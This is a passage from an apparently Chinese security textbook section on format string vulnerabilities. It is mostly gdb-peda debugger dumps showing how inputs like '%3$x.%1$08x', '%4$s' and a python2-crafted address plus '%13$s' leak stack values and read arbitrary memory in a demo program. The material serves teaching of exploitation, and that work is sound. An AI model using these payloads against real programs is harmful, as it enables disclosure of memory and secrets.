arg[4]: 0xffffd57a ("ABCD")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd550 --> 0xffffd584 ("%p.%p.%p.%p.%p")
0004| 0xffffd554 --> 0x1
0008| 0xffffd558 --> 0x88888888
0012| 0xffffd55c --> 0xffffffff
0016| 0xffffd560 --> 0xffffd57a ("ABCD")
0020| 0xffffd564 --> 0xffffd584 ("%p.%p.%p.%p.%p")
0024| 0xffffd568 (" RUV\327UUVT\332\377\367\001")
0028| 0xffffd56c --> 0x565555d7 (: add ebx,0x1a2
9)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ c
Continuing.
0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584
上面的方法都是依次获得栈中的参数，如果我们想要直接获得被指定的某个参数，
则可以使用类似下面的格式字符串：
%$
%n$x
这里的 n 表示栈中格式字符串后面的第 n 个值。
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd584 ("%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p")
EBX: 0x56557000 --> 0x1efc
ECX: 0x1
329
3.1.1 格式化字符串漏洞
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
ESP: 0xffffd550 --> 0xffffd584 ("%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p
.%6$p")
EIP: 0x56555642 (: call 0x56555430 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x56555638 : push DWORD PTR [ebp-0xc]
0x5655563b : lea eax,[ebp-0x94]
0x56555641 : push eax
=> 0x56555642 : call 0x56555430 
0x56555647 : add esp,0x20
0x5655564a : sub esp,0xc
0x5655564d : push 0xa
0x5655564f : call 0x56555450 
Guessed arguments:
arg[0]: 0xffffd584 ("%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p")
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a ("ABCD")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd550 --> 0xffffd584 ("%3$x.%1$08x.%2$p.%2$p.%4$p.%5$
p.%6$p")
0004| 0xffffd554 --> 0x1
0008| 0xffffd558 --> 0x88888888
0012| 0xffffd55c --> 0xffffffff
0016| 0xffffd560 --> 0xffffd57a ("ABCD")
0020| 0xffffd564 --> 0xffffd584 ("%3$x.%1$08x.%2$p.%2$p.%4$p.%5$
p.%6$p")
0024| 0xffffd568 (" RUV\327UUVT\332\377\367\001")
0028| 0xffffd56c --> 0x565555d7 (: add ebx,0x1a2
9)
[---------------------------------------------------------------
---------------]
330
3.1.1 格式化字符串漏洞
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ x/10w $esp
0xffffd550: 0xffffd584 0x00000001 0x88888888
0xffffffff
0xffffd560: 0xffffd57a 0xffffd584 0x56555220
0x565555d7
0xffffd570: 0xf7ffda54 0x00000001
gdb-peda$ c
Continuing.
ffffffff.00000001.0x88888888.0x88888888.0xffffd57a.0xffffd584.0x
56555220
这里，格式字符串的地址为 0xffffd584 。我们通过格式字符串
%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p 分别获取了 arg3 、 arg1 、两个
arg2 、 arg4 和栈上紧跟参数的两个值。可以看到这种方法非常强大，可以获
得栈中任意的值。
查看任意地址的内存
攻击者可以使用一个“显示指定地址的内存”的格式规范来查看任意地址的内存。例
如，使用 %s 显示参数 指针所指定的地址的内存，将它作为一个 ASCII 字符串
处理，直到遇到一个空字符。如果攻击者能够操纵这个参数指针指向一个特定的地
址，那么 %s 就会输出该位置的内存内容。
还是上面的程序，我们输入 %4$s ，输出的 arg4 就变成了 ABCD 而不是地址
0xffffd57a ：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd584 ("%4$s")
EBX: 0x56557000 --> 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
331
3.1.1 格式化字符串漏洞
ESP: 0xffffd550 --> 0xffffd584 ("%4$s")
EIP: 0x56555642 (: call 0x56555430 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x56555638 : push DWORD PTR [ebp-0xc]
0x5655563b : lea eax,[ebp-0x94]
0x56555641 : push eax
=> 0x56555642 : call 0x56555430 
0x56555647 : add esp,0x20
0x5655564a : sub esp,0xc
0x5655564d : push 0xa
0x5655564f : call 0x56555450 
Guessed arguments:
arg[0]: 0xffffd584 ("%4$s")
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a ("ABCD")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd550 --> 0xffffd584 ("%4$s")
0004| 0xffffd554 --> 0x1
0008| 0xffffd558 --> 0x88888888
0012| 0xffffd55c --> 0xffffffff
0016| 0xffffd560 --> 0xffffd57a ("ABCD")
0020| 0xffffd564 --> 0xffffd584 ("%4$s")
0024| 0xffffd568 (" RUV\327UUVT\332\377\367\001")
0028| 0xffffd56c --> 0x565555d7 (: add ebx,0x1a2
9)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ c
Continuing.
ABCD
332
3.1.1 格式化字符串漏洞
上面的例子只能读取栈中已有的内容，如果我们想获取的是任意的地址的内容，就
需要我们自己将地址写入到栈中。我们输入 AAAA.%p 这样的格式的字符串，观察
一下栈有什么变化。
gdb-peda$ python print("AAAA"+".%p"*20)
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
...
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd584 ("AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
.%p.%p.%p.%p.%p.%p")
EBX: 0x56557000 --> 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
ESP: 0xffffd550 --> 0xffffd584 ("AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p
.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
EIP: 0x56555642 (: call 0x56555430 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x56555638 : push DWORD PTR [ebp-0xc]
0x5655563b : lea eax,[ebp-0x94]
0x56555641 : push eax
=> 0x56555642 : call 0x56555430 
0x56555647 : add esp,0x20
0x5655564a : sub esp,0xc
0x5655564d : push 0xa
0x5655564f : call 0x56555450 
Guessed arguments:
arg[0]: 0xffffd584 ("AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
.%p.%p.%p.%p.%p.%p.%p")
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a ("ABCD")
333
3.1.1 格式化字符串漏洞
[------------------------------------stack----------------------
---------------]
0000| 0xffffd550 --> 0xffffd584 ("AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%
p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
0004| 0xffffd554 --> 0x1
0008| 0xffffd558 --> 0x88888888
0012| 0xffffd55c --> 0xffffffff
0016| 0xffffd560 --> 0xffffd57a ("ABCD")
0020| 0xffffd564 --> 0xffffd584 ("AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%
p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
0024| 0xffffd568 (" RUV\327UUVT\332\377\367\001")
0028| 0xffffd56c --> 0x565555d7 (: add ebx,0x1a2
9)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x56555642 in main ()
格式字符串的地址在 0xffffd584 ，从下面的输出中可以看到它们在栈中是怎样
排布的：
334
3.1.1 格式化字符串漏洞
gdb-peda$ x/20w $esp
0xffffd550: 0xffffd584 0x00000001 0x88888888
0xffffffff
0xffffd560: 0xffffd57a 0xffffd584 0x56555220
0x565555d7
0xffffd570: 0xf7ffda54 0x00000001 0x424135d0
0x00004443
0xffffd580: 0x00000000 0x41414141 0x2e70252e
0x252e7025
0xffffd590: 0x70252e70 0x2e70252e 0x252e7025
0x70252e70
gdb-peda$ x/20wb 0xffffd584
0xffffd584: 0x41 0x41 0x41 0x41 0x2e 0x25
0x70 0x2e
0xffffd58c: 0x25 0x70 0x2e 0x25 0x70 0x2e
0x25 0x70
0xffffd594: 0x2e 0x25 0x70 0x2e
gdb-peda$ python print('\x2e\x25\x70')
.%p
下面是程序运行的结果：
gdb-peda$ c
Continuing.
AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.
0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2
e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0
x2e70252e
0x41414141 是输出的第 13 个字符，所以我们使用 %13$s 即可读出
0x41414141 处的内容，当然，这里可能是一个不合法的地址。下面我们把
0x41414141 换成我们需要的合法的地址，比如字符串 ABCD 的地址
0xffffd57a ：
$ python2 -c 'print("\x7a\xd5\xff\xff"+".%13$s")' > text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done
.
335
3.1.1 格式化字符串漏洞
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r  0xffffd57a ("ABCD")
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
ESP: 0xffffd54c --> 0x8048520 (: add esp,0x20)
EIP: 0xf7e27c20 (: call 0xf7f06d17 )
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7e27c1b : ret
0xf7e27c1c: xchg ax,ax
0xf7e27c1e: xchg ax,ax
=> 0xf7e27c20 : call 0xf7f06d17 
0xf7e27c25 : add eax,0x16f243
0xf7e27c2a : sub esp,0xc
0xf7e27c2d : mov eax,DWORD PTR [eax+0x124]
0xf7e27c33 : lea edx,[esp+0x14]
No argument
[------------------------------------stack----------------------
---------------]
0000| 0xffffd54c --> 0x8048520 (: add esp,0x20)
0004| 0xffffd550 --> 0xffffd584 --> 0xffffd57a ("ABCD")
0008| 0xffffd554 --> 0x1
0012| 0xffffd558 --> 0x88888888
0016| 0xffffd55c --> 0xffffffff
0020| 0xffffd560 --> 0xffffd57a ("ABCD")
0024| 0xffffd564 --> 0xffffd584 --> 0xffffd57a ("ABCD")
0028| 0xffffd568 --> 0x80481fc --> 0x38 ('8')
[---------------------------------------------------------------
336
3.1.1 格式化字符串漏洞
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20w $esp